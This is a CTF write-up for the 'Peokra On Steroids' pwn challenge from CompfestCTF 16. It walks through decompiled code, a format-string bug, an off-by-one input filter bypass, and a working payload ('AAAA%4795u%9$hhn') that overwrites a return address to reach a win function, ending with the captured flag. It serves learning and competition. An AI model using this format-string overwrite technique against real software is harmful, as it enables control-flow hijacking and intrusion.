# Peokra On Steroids Writeup by Deffreus - CompfestCTF 16

###### Author: nabilmuafa

## Description

Alkisah, hidup seseorang bernama Peokra yang merupakan maskot mata kuliah Pengantar Organisasi Komputer di Fasilkom UI.
Kali ini, Peokra bikin suatu kode C yang harusnya manggil suatu fungsi,
tapi dia nggak sengaja typo malah jadi nulis `exit(1)`,
jadi fungsinya nggak kepanggil.
Masalahnya, kodenya nggak bisa diganti.
Kira-kira bisa nggak ya ke fungsi itu tanpa perlu ngubah kodenya?
Si Peokra sih yakin kodenya aman, soalnya udah pake full proteksi.

`nc challenges.ctf.compfest.id 20007`

[chall](https://ctf.compfest.id/files/49789503571739ad342e1b5c3bdff7b7/chall?token=eyJ1c2VyX2lkIjo3MiwidGVhbV9pZCI6MzA3LCJmaWxlX2lkIjo0NX0.Zr6o4w.gPco3pD6zElpwbRhRQnWmy9ws-I)

## Files

```
$ file chall 
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ca9750735a294729046c39036987a2942de32058, for GNU/Linux 3.2.0, not stripped
```

## Solution

> [!NOTE]
> A character is a byte long.
> These two terms are interchangeable here.

### Examining the Binary

This is quite a new challenge for me, and this is the resources that got me through it:

- [RELRO](https://ctf101.org/binary-exploitation/relocation-read-only/)
- [Format string vulnerability](https://cs155.stanford.edu/papers/formatstring-1.2.pdf)
- [Challenge Editorial](https://drive.google.com/drive/u/0/folders/1sBXJ-yojtGbA8lIe5RORNvm9VPyzpuTC)

"Full protection", huh?

```
$ checksec --file=chall
RELRO       STACK CANARY  NX          PIE         RPATH     RUNPATH     Symbols     FORTIFY Fortified Fortifiable FILE
Full RELRO  Canary found  NX enabled  PIE enabled No RPATH  No RUNPATH  78 Symbols  No      0         3           chall
```

In short:

- RELRO prevent Global Offset Table (GOT) to be overwritten. Full RELRO *should* prevent even format string exploit in correct circumstances.
- Stack Canary preventing stack-based buffer overflow attacks. Irrelevant here.
- NX protection marks a memory page as Non-Executable, preventing any program code there. Irrelevant here.
- PIE load binary into a different memory address each time it's executed.

Here's the beautified version of the [decompiled code](https://dogbolt.org/?id=54dda318-231c-496f-89ac-b67c87c6d9ea#Hex-Rays=6&Ghidra=294&BinaryNinja=218&angr=266&RetDec=222&rev.ng=180) (Hex-Rays), annotated:

```chall.c
int main(int argc, const char **argv, const char **envp);
int win();
int vuln();

const char aPertamaMasukka[60] = "Pertama, masukkan umur kalian untuk disesuaikan sama input ("; // idb
_UNKNOWN unk_20F4; // weak
const char aDibilangGaBole[34] = "Dibilang ga boleh input 'n'!!!!!! "; // idb
FILE *stdout; // idb
FILE *stdin; // idb
FILE *stderr; // idb

// __fastcall __noreturn
int main(int argc, const char **argv, const char **envp) {
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  vuln();
  exit(1);
}

int win() {
  FILE *stream;
  char s[264];

  puts("Semoga masih gampang banged yh");
  if ( stream ) {
		stream = fopen("flag.txt", "r");
    fgets(s, 256, stream);
    return puts(s);
  } else {
    printf("File flag.txt does not exist! >:(");
    return 69;
  }
}

int vuln() {
  char buf[24]; // 24 bytes; rbp-0x20

  int v1 = 0; // 4 bytes; rbp-0x34
	char *v4 = buf; // a byte; unused; rbp-0x28 -> rbp-0x18
  puts("Halo, aku Peokra!! Aku bikin program yang bisa nerima input dari kalian.");
	printf(aPertamaMasukka);
  // angr, dewolf, Reko, Relyze, RetDec, rev.ng, & Snowman: format string is "%d"
  __isoc99_scanf(&unk_20F4, &v1);
  v4 += 4 * v1;
  puts("Sekarang input, tapi kalian gak boleh masukin huruf 'n' ya:");
	int v2 = 1; // 4 bytes; rbp-0x30
	for ( int i = 0 /* rbp-0x2c */; i < v1 - 1; ++i ) {
    v1 = read(0, buf, 0x10uLL);
    if ( buf[i] == 110 /* 0x6e; 'n' */ ) {
      v2 = 0;
      break;
    }
  }
  if ( v2 ) {
    printf("Kamu menginput: ");
    return printf(buf);
  } else {
    puts(aDibilangGaBole);
    return 0;
  }
}
```

Here's the plan:<br>
We want to `win` and get the flag, but that function isn't called at all in the code.
This basically calls us to do some Return-Oriented Programming (ROP) where we overwrite the return address of a function,
into `win`.
That vulnerable function would be `vuln`, obviously.

The main vulnerability here is `printf(buf)`, a format string vulnerability.
See and read the resources above!<br>
Main take-away: we can use the `%n` format identifier to write into the memory.
The write value can be set with `%999u`, where `999` could be any number value.

We'll have two payload from `scanf("%d", &v1)` and `read(0, buf, 0x10uLL)`.
`0` is the file descriptor for standard input.
`v1` will hold the return value of `read()`,
the number of byte written to memory,
or in other word, the length of input.

The second payload serve to write the address of `win`, `0x00000000000012bf`.
What the first payload will do is to offset the pointer,
so that it's pointing to the memory address that holds return address of `vuln`.

But something isn't quite right here...
If we input `0` in `scanf`, that would mean `v1` would be `0` and the for loop won't iterate even once,
but it still running into `read`...

Ghidra has another take on the code, a more correct one (annotated and renamed):

```chall.c
void main(void) {
  setvbuf(stdout, (char *)0x0, 2, 0);
  setvbuf(stdin,  (char *)0x0, 2, 0);
  setvbuf(stderr, (char *)0x0, 2, 0);
  vuln(); // WARNING: Subroutine does not return
  exit(1);
}

int win(void) {
  int result;
  char s[264];
  long local_10 = *(long *)(in_FS_OFFSET + 0x28);
  
  puts("Semoga masih gampang banged yh");
  FILE *__stream = fopen("flag.txt","r");
  if ( __stream == (FILE *)0x0 ) {
    printf("File flag.txt does not exist! >:(");
    result = 0x45;
  } else {
    fgets(s, 0x100, __stream);
    result = puts(s);
  }
  if ( local_10 != *(long *)(in_FS_OFFSET + 0x28) ) {
    __stack_chk_fail(); // WARNING: Subroutine does not return
  }
  return result;
}

int vuln(void) {
  int result;
  long in_FS_OFFSET;
  char buf[24];
  long local_10 = *(long *)(in_FS_OFFSET + 0x28);
  
  char *ptr = buf;
  int input_length = 0;
  puts("Halo, aku Peokra!! Aku bikin program yang bisa nerima input dari kalian.");
  printf("Pertama, masukkan umur kalian untuk disesuaikan sama input (");
  __isoc99_scanf("%d", &input_length);
  ptr = ptr + (long)input_length * 4;
  puts("Sekarang input, tapi kalian gak boleh masukin huruf 'n' ya:");
  input_length = (int)read(0, buf, 0x10);
  int v2 = 1;
  int i = 0;
  do {
    if ( input_length - 1 <= i ) { // read() does not return error
LAB_0010144e:
      if ( v2 == 0 ) {
        puts(&DAT_00102138);
        result = 0;
      } else {
        printf("Kamu menginput: ");
        result = printf(buf);
      }
      if ( local_10 == *(long *)(in_FS_OFFSET + 0x28) ) {
        return result;
      }
      __stack_chk_fail(); // WARNING: Subroutine does not return
    }
    if ( buf[i] == 'n' ) {
      v2 = 0;
      goto LAB_0010144e;
    }
    ++i;
  } while( true );
}
```

The difference is clear,
`vuln` looks way different.<br>
`scanf()` is now before the loop,
as how it should be from our previous testing.

There's another vulnerability here:
the do while loop checks for each character,
except the last one!<br>
This means that we can input the character `n` used for the `%n` format identifier,
allowing us to overwrite the return address in memory.

### Second Payload

With our knowledge on format string vulnerability,
our second payload looks like this: `<OFFSET>%4795u%9$hhn`
We use the `hh` modifier on `%n` so that it points to a byte.

`4795` is the decimal representation of `0x12bb`,
close to address of `win`, `0x12bf`.
This more of an on-the-field adjustment,
as when I use the latter (as hypothesis said it should be),
it would actually point off by one instruction like this:

```
0x00007ffe55993468│+0x0048: 0x000055d553d652c3  →  <win+0004> push rbp
```

Our `<OFFSET>` would be a 4 character padding, `AAAA`,
since our input must be 16 byte length and `%4795u%9$hhn` is already 12 byte.

In format string identifier, `$` allow us to access arguments by it's position,
so `9$` would refer to the ninth argument passed to `printf()`.
But isn't `printf(buf)` only has one argument?
That's correct,
but this relate to how the stack is arranged,
as there are other variable or saved registers in the stack.
That `9$` is kind of a pointer relative,
causing us to skip the 8 other "arguments" on the stack,
arriving at the correct memory address to overwrite.

How do we know it's `9`?
To be honest, trial and error was how I find it :p<br>
Maybe, this could relate to the stack,
as shown here from `gdb` when the program is inside `vuln`:

```
0x00007ffdfd628d00│+0x0000: 0x00007ff48cd66600  →  0x0000000000000000    ← $rsp
0x00007ffdfd628d08│+0x0008: 0x0000000a8cbd95ad
0x00007ffdfd628d10│+0x0010: 0x00007ff48cd6a6a0  →  0x00000000fbad2087
0x00007ffdfd628d18│+0x0018: 0x00007ffdfd628d48  →  0x000055b44959b2b5  →  <main+006c> mov edi, 0x1
0x00007ffdfd628d20│+0x0020: 0x0000000000000000   ← $rsi
0x00007ffdfd628d28│+0x0028: 0x00007ffdfd628d50  →  0x0000000000000001
0x00007ffdfd628d30│+0x0030: 0x00007ffdfd628e68  →  0x00007ffdfd629759  →  "/home/vinnie/CTF/Pwn/Compfest CTF/Peokra On Steroids/chall"
0x00007ffdfd628d38│+0x0038: 0xddfdef072567d100
0x00007ffdfd628d40│+0x0040: 0x00007ffdfd628d50  →  0x0000000000000001    ← $rbp
0x00007ffdfd628d48│+0x0048: 0x000055b44959b2b5  →  <main+006c> mov edi, 0x1
```

That offset in stack holds the return address,
pointing to an instruction in `main` right after the call to `vuln`:

```
0x000055b44959b2b0 <+103>:   call   0x55b44959b365 <vuln>
0x000055b44959b2b5 <+108>:   mov    edi,0x1
```

Notice how it's the ninth line on the stack?

Now, one thing left,
when we type our input and press the return key,
the newline character is actually included!
Say, we input `ABCD`,
the stack would be like:

```
0x00007ffc5b499a58│+0x0018: 0x00007ffc5b499a60  →  0x0000000a44434241 ("ABCD\n"?)
0x00007ffc5b499a60│+0x0020: 0x0000000a44434241 ("ABCD\n"?)       ← $rsi
0x00007ffc5b499a68│+0x0028: 0x00007ffc5b499a90  →  0x0000000000000001
```

Notice the `\n` there?
That's the newline character.
We don't want that.
We can get around this by piping our payload from a file,
`./chall <payload`.

### First Payload

If we input `0` on on first payload,
on the same memory offset by PIE,
the stack would looks like this:

```
0x00007ffe94644a28│+0x0018: 0x00007ffe94644a30  →  0x0000000000000000
0x00007ffe94644a58│+0x0048: 0x0000558dcff682b5  →  <main+006c> mov edi, 0x1
```

First line is `ptr`, while second line is the return address.
Here, the return address is held by the offset `+0x40` relative to `ptr`,
at `0x00007ffe94644a58`
This means that we need to increase `ptr` by 40,
divide it by 4,
and so our first payload would be `10`.

### The Exploitation

First Payload: `10`
Second Payload: `AAAA%4795u%9$hhn`

```
$ xxd payload
00000000: 3130 0a41 4141 4125 3437 3935 7525 3924  10.AAAA%4795u%9$
00000010: 6868 6e                                  hhn
$ nc challenges.ctf.compfest.id 20007 <payload 
Halo, aku Peokra!! Aku bikin program yang bisa nerima input dari kalian.
Pertama, masukkan umur kalian untuk disesuaikan sama input (😅): Sekarang input, tapi kalian gak boleh masukin huruf 'n' ya:
Kamu menginput: AAAA                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 1979292976`���"VSemoga masih gampang banged yh
COMPFEST16{buffer_overflow_mulai_mainstream_jadi_disini_gw_bikin_format_string_7a83bb1619}
```

YAY!!<br>
We got it!

FlAG: `COMPFEST16{buffer_overflow_mulai_mainstream_jadi_disini_gw_bikin_format_string_7a83bb1619}`
